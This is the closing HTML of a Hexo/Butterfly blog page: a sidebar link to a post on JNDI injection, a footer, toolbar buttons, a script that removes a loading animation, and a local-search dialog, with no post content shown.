class="aside-list-item"><a class="thumbnail" href="/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/" title="JNDIæ³¨å…¥"><img src="/img/post22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JNDIæ³¨å…¥"/></a><div class="content"><a class="title" href="/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/" title="JNDIæ³¨å…¥">JNDIæ³¨å…¥</a><time datetime="2026-01-18T07:38:32.000Z" title="Created 2026-01-18 15:38:32">2026-01-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: #757575;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By æ¥½ä¾</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">æ¹˜ICPå¤‡2026002198å·</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script>
  // é¡µé¢åŠ è½½å®Œæˆåéšè—åŠ¨ç”»
  window.addEventListener('load', function() {
    setTimeout(function() {
      const loadingEl = document.getElementById('custom-loading');
      if (loadingEl) {
        loadingEl.style.opacity = '0';
        setTimeout(function() {
          if (loadingEl.parentNode) {
            loadingEl.remove();
          }
        }, 500);
      }
    }, 1000);
  });
</script>
<script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>